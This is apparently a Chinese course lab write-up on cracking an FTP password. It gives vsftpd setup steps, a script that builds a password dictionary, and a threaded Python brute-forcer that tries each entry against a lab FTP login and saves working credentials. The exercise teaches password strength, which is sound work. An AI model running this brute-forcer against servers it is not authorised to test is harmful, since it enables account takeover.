# 程序破解FTP服务器密码

标签（空格分隔）： python

---

##1、实验目的
通过开发FTP口令破解程序，认识到如何设置一个强壮的的口令以及其对系统安全的重要性。

##2、 实验内容
选用一种熟悉的语言编写FTP口令破解程序。
(1) 有一FTP服务器，事先设置好了一对用户名和密码。其中用户名已知，密码未知，但知道是一个不大于4位的纯数字密码。程序的功能是对FTP服务器该用户的密码进行暴力破解，并记录破解所用的时间。
(2) 将密码设置成4位的含有数字、字母、特殊符号(如*^%@等)的字符密码，修改程序进行破解，记录破解所用的时间；再将密码设置成8位的含有各类字符的密码，再进行破解，记录破解结果。

##3、 实验准备
架设一个简单的FTP服务器，分配用户，并按实验内容设置密码。


----------
**1、在ubuntu系统中检查是否安装了vsftpd**

> vsftpd –version

如果未安装用一下命令安装
> sudo apt-get install vsftpd

安装完成后，再次输入vsftpd -version命令查看是否安装成功

**2、新建一个文件夹用于FTP的工作目录**
> sudo mkdir /home/ftp

**3、新建FTP用户并设置密码以及工作目录**
>sudo useradd -d/home/ftp -s /bin/bash ftpname
passwd ftpname(设置密码)

**4、配置vsftpd配置文件**

反正位置就在/etc/vsftpd.conf，怎么配置自己Google咯

**5、启动vsftpd服务**
>sudo service vsftpd start


----------
#排列组合生成密码字典

```python
import itertools
for i in itertools.combinations_with_replacement('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789,./<>?;:\'\"[{]}\\|`~!@#$%^&*()_-+=', 4):
	print (''.join(i)) 
```


----------
#爆破主函数
```python
#coding=utf8
import threading
import ftplib
import socket
import sys
import time
def ftp(i,j):＃具体的执行函数，由创建进程时的target指向
    ftp=ftplib.FTP('192.168.48.181')#ftp服务器的ip地址
    try:
        user="ftpname"  #用户名已知 为ftpname
        passwd=j
        ftp.login(user,passwd)
        hand=open('aa.txt','a+')
        hand.write(user+":"+passwd+"\n") #将正确的用户名密码写入文件aa中
        print user+":"+passwd+"\n"
    except ftplib.error_perm:
	    print "passwd is wrong"
def main():  
    pshand=open("passwd1.txt","r")#passwd1.txt是字典，由tt.py生成
    listpass=[]
    threads=[]
    for ps in open("passwd1.txt","r"):
        lineps=pshand.readline().strip('\n')
        listpass.append(lineps)
    i="ftpname"
    for j in listpass:
        command="%s %s" %(i,j)
        print command
        t=threading.Thread(target=ftp,args=(i,j))
        threads.append(t)
    for i in range(len(threads)):
        threads[i].start()
        time.sleep(0.08)#经测试，小于0.05秒后将报线程过多的错误
    print 'finished'    
if __name__=='__main__':
    main()
```

	